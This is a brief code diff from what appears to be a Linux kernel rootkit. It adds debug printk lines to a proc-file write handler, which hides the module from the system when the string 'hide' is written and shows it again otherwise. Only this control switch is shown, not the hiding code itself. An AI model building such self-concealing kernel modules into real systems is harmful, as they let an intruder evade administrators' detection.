@@ -27,9 +27,11 @@ ssize_t handler_write_proc_file(
 
     if (strncmp(buffer, "hide", 4) == 0) {
         module_hide();
+        printk("rootkit: WRITE HIDE\n");
     }
     else {
         module_show();
+        printk("rootkit: WRITE SHOW\n");
     }
 
     return length;
